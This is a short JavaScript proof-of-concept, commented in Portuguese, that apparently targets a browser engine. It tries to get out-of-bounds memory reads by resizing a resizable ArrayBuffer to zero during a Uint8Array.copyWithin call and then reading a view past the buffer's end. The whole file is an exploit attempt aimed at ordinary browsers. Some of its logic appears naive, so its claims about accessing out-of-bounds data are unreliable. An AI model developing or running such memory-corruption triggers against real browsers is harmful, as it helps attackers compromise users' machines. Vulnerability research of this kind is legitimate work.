(function() {
    function log(msg) {
        const p = document.createElement("p");
        p.textContent = msg;
        document.body.appendChild(p);
    }

    try {
        const ab = new ArrayBuffer(0x1000, { "maxByteLength": 0x10000 });  // Expande o tamanho máximo do buffer
        const u8 = new Uint8Array(ab);

        log("Inicial - ab.byteLength: " + ab.byteLength);

        const call_back = function () {
            log("Callback executado. Tentando reduzir o buffer...");
            try {
                ab.resize(0);  // Tenta reduzir o buffer para 0
                log("Resize bem-sucedido.");
            } catch (e) {
                log("Erro ao tentar resize: " + e);
            }
            return 0;
        };

        // A operação de copyWithin agora tenta acessar dados fora do limite do ArrayBuffer
        u8.copyWithin(0x20, { valueOf: call_back });

        // Agora vamos tentar manipular os dados fora do buffer original
        const manipulatedData = new Uint8Array(ab, 0x10000, 0x10000);  // Tentando acessar além dos limites

        // Verificando se conseguimos acessar dados fora do buffer
        log("Tentando acessar dados fora do buffer...");
        for (let i = 0; i < manipulatedData.length; i++) {
            log(`Manipulado ${i}: ${manipulatedData[i]}`);
        }

        log("Após copyWithin - ab.byteLength: " + ab.byteLength);
    } catch (e) {
        log("Erro geral: " + e);
    }
})();
